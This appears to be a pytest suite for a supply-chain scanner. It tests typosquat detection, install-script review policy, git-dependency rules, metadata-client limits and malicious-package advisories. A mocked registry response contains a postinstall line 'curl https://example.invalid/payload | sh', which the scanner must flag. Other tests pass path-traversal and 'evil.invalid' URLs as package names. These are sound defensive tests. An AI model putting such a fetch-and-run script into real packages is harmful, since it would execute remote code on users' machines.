import hashlib
import json
from datetime import datetime, timezone

import httpx
import pytest
import yaml

from guardian.evidence import EvidenceStore
from guardian.graph import build_graph
from guardian.metadata import MetadataClient, MetadataError
from guardian.models import Finding, Inventory
from guardian.npm import reconcile_npm_projects
from guardian.signals import (SNAPSHOT_SHA256, detect_signals, git_reference, load_snapshot,
                              similar_names, typo_index)


def fixture(repo, *, scripts=None, dependency="lodahs", flagged=True):
    manifest = {"name": "fixture", "dependencies": {dependency: "1.0.0"}}
    if scripts is not None:
        manifest["scripts"] = scripts
    lock = {"lockfileVersion": 3, "packages": {"": manifest,
            "node_modules/" + dependency: {"version": "1.0.0", "hasInstallScript": flagged}}}
    (repo / "package.json").write_text(json.dumps(manifest))
    (repo / "package-lock.json").write_text(json.dumps(lock))
    return reconcile_npm_projects(repo, "package-lock.json", ["package.json"], "repo:test")


def metadata(request):
    assert request.url.host in {"registry.npmjs.org", "api.deps.dev"}
    assert request.method == "GET" and "advisories" not in request.url.path
    if request.url.host == "registry.npmjs.org":
        return httpx.Response(200, json={"name": "lodahs", "version": "1.0.0", "scripts": {
            "install": "node-gyp rebuild", "postinstall": "curl https://example.invalid/payload | sh"},
            "dist": {"tarball": "https://must-never-fetch.invalid/package.tgz"}})
    if "/projects/" in request.url.path:
        return httpx.Response(200, json={"projectKey": {"id": "github.com/fixture/lodahs"}, "starsCount": 3})
    if "/versions/" in request.url.path:
        return httpx.Response(200, json={"versionKey": {"system": "NPM", "name": "lodahs", "version": "1.0.0"},
            "advisoryKeys": [{"id": "MAL-ignored-metadata"}], "relatedProjects": [{"projectKey": {"id": "github.com/fixture/lodahs"},
            "relationType": "SOURCE_REPO", "relationProvenance": "UNVERIFIED_METADATA"}]})
    return httpx.Response(200, json={"packageKey": {"system": "NPM", "name": "lodahs"}, "versions": [{
        "versionKey": {"system": "NPM", "name": "lodahs", "version": "1.0.0"}, "publishedAt": datetime.now(timezone.utc).isoformat()}]})


def run(repo, inventory, tmp_path, *, transport=None, policy_path=None):
    store = EvidenceStore(tmp_path / "evidence", "a" * 40)
    result = detect_signals(repo, inventory, build_graph(inventory), store, "scan", "a" * 40,
                            transport=transport or httpx.MockTransport(metadata), policy_path=policy_path)
    store.validate([Finding.model_validate(f) for f in result["findings"]])
    return result, store


def test_current_state_checks_work_without_baseline_and_never_execute_scripts(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    inventory = fixture(repo, scripts={"postinstall": "touch should-never-exist"})
    original = {p.name: p.read_bytes() for p in repo.iterdir()}
    report, store = run(repo, inventory, tmp_path)
    types = {f["finding_type"] for f in report["findings"]}
    assert types == {"install_script", "policy_violation", "typosquat"}
    typo = next(f for f in report["findings"] if f["finding_type"] == "typosquat")
    assert typo["source_metadata"][0]["comparison_names"] == ["lodash"]
    assert typo["confidence"] == .75
    assert typo["verification_status"] == "provisional"
    assert typo["source_metadata"][0]["metadata"]["project_stars"] == 3
    assert report["policy_status"] == "failed"
    assert report["status"] == "completed"  # Detector success and policy compliance are separate.
    assert report["metadata_client"]["requests"] == 4
    assert any(f["source_metadata"][0].get("patterns") == ["download_and_execute"] for f in report["findings"])
    assert all(f["baseline_commit"] is None for f in report["findings"])
    assert not any(f["finding_type"] == "vulnerability" for f in report["findings"])
    assert original == {p.name: p.read_bytes() for p in repo.iterdir()}
    assert all(f["evidence_ids"] for f in report["findings"])
    assert any(r["source_type"] == "pinned_npm_popularity_snapshot" and r["sha256"] == SNAPSHOT_SHA256 for r in store.records.values())


def test_script_reviews_bind_to_exact_commands_and_repository_policy_is_ignored(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    command = "node setup.js"
    inventory = fixture(repo, dependency="lodash", flagged=False, scripts={"postinstall": command})
    (repo / "policy.yaml").write_text("rules: {no_unreviewed_install_scripts: false}")
    report, _ = run(repo, inventory, tmp_path)
    assert report["policy_violations"] == 1
    policy = {"version": 1, "rules": {"no_git_dependencies": True, "no_unreviewed_install_scripts": True},
              "reviewed_install_scripts": [{"file": "package.json", "lifecycle": "postinstall", "sha256": hashlib.sha256(command.encode()).hexdigest()}]}
    path = tmp_path / "trusted-policy.yaml"
    path.write_text(yaml.safe_dump(policy))
    report, _ = run(repo, inventory, tmp_path, policy_path=path)
    assert report["policy_violations"] == 0 and report["policy_status"] == "passed"
    inventory = fixture(repo, dependency="lodash", flagged=False, scripts={"postinstall": command + " --changed"})
    report, _ = run(repo, inventory, tmp_path, policy_path=path)
    assert report["policy_violations"] == 1


def test_dependency_script_reviews_bind_to_package_version_and_command(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    inventory = fixture(repo)
    policy = {"version": 1, "rules": {"no_git_dependencies": True, "no_unreviewed_install_scripts": True},
              "reviewed_install_scripts": [{"package": "lodahs", "version": "1.0.0", "lifecycle": lifecycle,
                "sha256": hashlib.sha256(command.encode()).hexdigest()} for lifecycle, command in {
                    "install": "node-gyp rebuild", "postinstall": "curl https://example.invalid/payload | sh"}.items()]}
    path = tmp_path / "trusted-policy.yaml"
    path.write_text(yaml.safe_dump(policy))
    report, _ = run(repo, inventory, tmp_path, policy_path=path)
    assert report["policy_status"] == "passed" and report["policy_violations"] == 0
    policy["reviewed_install_scripts"][0]["version"] = "1.0.1"
    path.write_text(yaml.safe_dump(policy))
    report, _ = run(repo, inventory, tmp_path, policy_path=path)
    assert report["policy_status"] == "failed" and report["policy_violations"] == 1


@pytest.mark.parametrize("value", ["git+https://github.com/a/b.git#commit", "git://host/repo", "git@github.com:a/b.git",
                                  "github:a/b", "gitlab:a/b", "bitbucket:a/b", "a/b#tag", "https://example.test/repo.git"])
def test_git_reference_policy_recognizes_supported_forms(value):
    assert git_reference(value)


@pytest.mark.parametrize("value", ["^1.2.3", "npm:other@1.2.3", "file:../local", "https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz"])
def test_registry_versions_aliases_and_local_paths_are_not_git_policy_claims(value):
    assert not git_reference(value)


def test_git_policy_emits_source_evidence_and_handles_python_git_urls(tmp_path):
    from guardian.python import extract_python
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "requirements.txt").write_text("demo @ git+https://github.com/a/b.git\n")
    inventory = extract_python(repo, ["requirements.txt"], "repo")
    report, store = run(repo, inventory, tmp_path)
    finding = next(f for f in report["findings"] if f["rule_id"] == "POLICY_GIT_DEPENDENCY")
    assert finding["finding_type"] == "policy_violation" and finding["verification_status"] == "verified_match"
    assert report["policy_status"] == "failed" and report["metadata_client"]["requests"] == 0
    assert all(e in store.records for e in finding["evidence_ids"])


@pytest.mark.parametrize("response", [httpx.Response(503), httpx.Response(200, content=b"{"),
    httpx.Response(200, json={"name": "wrong", "version": "1.0.0"}),
    httpx.Response(200, json={"name": "lodahs", "version": "1.0.0", "scripts": {}})])
def test_missing_invalid_or_implicit_scripts_remain_unreviewed(tmp_path, response):
    repo = tmp_path / "repo"
    repo.mkdir()
    inventory = fixture(repo)
    report, _ = run(repo, inventory, tmp_path, transport=httpx.MockTransport(lambda request: response))
    assert report["status"] == "partial" and report["policy_status"] == "failed"
    assert any(f["rule_id"] == "POLICY_UNREVIEWED_INSTALL_SCRIPT" and f["verification_status"] == "undetermined" for f in report["findings"])
    assert any(f["finding_type"] == "typosquat" for f in report["findings"])


def test_popular_packages_do_not_trigger_typos_and_similarity_survives_metadata_outage(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    inventory = fixture(repo, dependency="lodash", flagged=False)
    report, _ = run(repo, inventory, tmp_path)
    assert not report["findings"] and report["metadata_client"]["requests"] == 0
    inventory = fixture(repo, flagged=False)
    report, _ = run(repo, inventory, tmp_path, transport=httpx.MockTransport(lambda request: httpx.Response(404)))
    typo = next(f for f in report["findings"] if f["finding_type"] == "typosquat")
    assert typo["confidence"] == .35 and typo["source_metadata"][0]["metadata"]["missing_evidence"]


def test_snapshot_has_real_provenance_and_scoped_names_do_not_cross_namespaces():
    snapshot, raw = load_snapshot()
    assert hashlib.sha256(raw).hexdigest() == SNAPSHOT_SHA256
    assert snapshot["upstream_commit"] in snapshot["source"] and snapshot["collected_at"]
    names = {"lodash", "express", "@trusted/core"}
    index = typo_index(names)
    assert similar_names("exress", names, index) == ["express"]
    assert similar_names("lodahs", names, index) == ["lodash"]
    assert similar_names("@other/core", names, index) == []


def test_tampered_source_invalid_policy_and_unknown_inventory_never_pass(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    inventory = fixture(repo)
    (repo / "package-lock.json").write_text("{}")
    report, _ = run(repo, inventory, tmp_path)
    assert report["status"] == "partial" and report["policy_status"] != "passed"
    assert not any(f["rule_id"] == "RULE_INSTALL_SCRIPT_FLAG" for f in report["findings"])
    policy = tmp_path / "bad-policy.yaml"
    policy.write_text("rules: [")
    report, _ = run(repo, inventory, tmp_path, policy_path=policy)
    assert report["status"] == "failed" and report["policy_status"] == "not_run"
    empty = tmp_path / "empty"
    empty.mkdir()
    report, _ = run(empty, Inventory(), tmp_path)
    assert report["policy_status"] == "partial"


def test_metadata_client_bounds_redirects_retry_cooldowns_and_identity(tmp_path):
    store = EvidenceStore(tmp_path / "evidence", "commit")
    calls = []
    def limited(request):
        calls.append(request)
        return httpx.Response(429, headers={"Retry-After": "3600"})
    with MetadataClient(store, transport=httpx.MockTransport(limited)) as client:
        with pytest.raises(MetadataError, match="429"):
            client.version("registry.npmjs.org", "lodash", "1.0.0")
        with pytest.raises(MetadataError, match="unavailable"):
            client.version("registry.npmjs.org", "lodash", "1.0.1")
        assert len(calls) == 1
    with MetadataClient(store, transport=httpx.MockTransport(metadata), max_requests=0) as client:
        with pytest.raises(MetadataError, match="budget"):
            client.package("lodash")
    with MetadataClient(store, transport=httpx.MockTransport(lambda request: httpx.Response(302, headers={"location": "http://localhost/private"}))) as client:
        with pytest.raises(MetadataError, match="302"):
            client.package("lodash")
    with MetadataClient(store, transport=httpx.MockTransport(lambda request: httpx.Response(200, content=b"x" * (2 * 1024 * 1024 + 1)))) as client:
        with pytest.raises(MetadataError, match="size/time"):
            client.package("lodash")
    with MetadataClient(store, transport=httpx.MockTransport(metadata)) as client:
        for name in ["../private", "https://evil.invalid"]:
            with pytest.raises(MetadataError): client.package(name)
        with pytest.raises(MetadataError): client.project("http://evil.invalid/project")


def test_mal_advisories_are_separate_and_withdrawn_mal_records_are_ignored(tmp_path):
    from guardian.osv import OSVClient
    from guardian.vulnerabilities import detect_vulnerabilities
    from test_vulnerabilities import advisory, inventory_fixture
    inventory = inventory_fixture(tmp_path)
    def respond(request):
        if request.url.path.endswith("querybatch"):
            queries = json.loads(request.content)["queries"]
            return httpx.Response(200, json={"results": [{"vulns": [{"id": "MAL-2099-fixture"}, {"id": "MAL-2099-withdrawn"}]} if q["version"] == "4.17.20" else {} for q in queries]})
        record = advisory(request.url.path.split("/")[-1])
        record["aliases"] = []
        if record["id"].endswith("withdrawn"): record["withdrawn"] = "2026-01-02T00:00:00Z"
        return httpx.Response(200, json=record)
    store = EvidenceStore(tmp_path / "evidence", "commit")
    with OSVClient(tmp_path / "cache", store, transport=httpx.MockTransport(respond)) as client:
        report = detect_vulnerabilities(inventory, build_graph(inventory), tmp_path, store, client, "scan", "commit")
    assert len(report["findings"]) == 1
    assert report["findings"][0]["advisory_category"] == "malicious_package"
    assert report["findings"][0]["classification"] == "malicious_package_advisory"
    assert report["findings"][0]["verification_status"] == "verified_match"


def test_detection_api_exports_policy_signals_evidence_and_separate_mal_counts(tmp_path):
    import time
    from fastapi.testclient import TestClient
    from guardian.app import create_app
    from guardian.files import write_json
    from test_phase2 import scan_fixture
    from test_vulnerabilities import advisory
    scan, repo, _, _ = scan_fixture(tmp_path)
    inventory = fixture(repo, scripts={"postinstall": "node setup.js"})
    write_json(scan / "artifacts/components.json", inventory.model_dump())
    write_json(scan / "artifacts/dependency_graph.json", build_graph(inventory))
    before = {p.name: p.read_bytes() for p in (scan / "artifacts").glob("*.json")}
    def osv(request):
        if request.url.path.endswith("querybatch"):
            return httpx.Response(200, json={"results": [{"vulns": [{"id": "MAL-2099-fixture"}]}]})
        record = advisory("MAL-2099-fixture")
        record["aliases"] = []
        record["affected"][0]["package"]["name"] = "lodahs"
        record["affected"][0]["versions"] = ["1.0.0"]
        return httpx.Response(200, json=record)
    with TestClient(create_app(tmp_path, osv_transport=httpx.MockTransport(osv), metadata_transport=httpx.MockTransport(metadata))) as client:
        assert client.post(f"/api/scans/{scan.name}/detect", json={}).status_code == 202
        for _ in range(300):
            state = client.get(f"/api/scans/{scan.name}/detection").json()
            if state["status"] not in {"queued", "running"}: break
            time.sleep(.01)
        report = state["report"]
        assert report["policy_status"] == "failed"
        assert report["verified_malicious_packages"] == 1 and report["verified_vulnerabilities"] == 0
        assert report["review_signals"] > 0 and report["policy_violations"] == 3
        assert client.get(f"/api/scans/{scan.name}/static-signals").json()["policy_status"] == "failed"
        finding = next(f for f in report["findings"] if f["finding_type"] == "typosquat")
        assert client.get(f"/api/scans/{scan.name}/findings/{finding['finding_id']}").json()["confidence"] == .75
        for evidence_id in finding["evidence_ids"]:
            assert client.get(f"/api/scans/{scan.name}/evidence/{evidence_id}").status_code == 200
    assert all((scan / "artifacts" / name).read_bytes() == raw for name, raw in before.items())
